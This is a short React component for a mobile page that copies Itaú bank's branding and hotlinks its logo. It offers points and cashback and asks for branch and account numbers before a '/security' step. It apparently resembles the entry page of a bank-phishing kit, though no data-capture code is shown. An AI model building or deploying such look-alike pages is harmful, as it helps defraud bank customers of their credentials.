import React from 'react'
import {Link} from 'react-router-dom'
import './FisicaMobile.css'

const FisicaMobile = () => {
  return (
    <div className='FisicaMobile'>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='title1'>
            <span>Ponto a ponto</span>
            <p>Ganhe pontos e cashback e<br />use esse benefício para economizar</p>
        </div>
        <div className='form1'>
            <input className='digitavel' type="text" placeholder='agência' />
            <input className='digitavel' type="text" placeholder='conta' /><br /><br />
            <input type="checkbox" /><label>lembrar de mim</label><br /><br /><br />
            <Link to="/security"><button>próximo</button></Link>
        </div>
    </div>
  )
}

export default FisicaMobile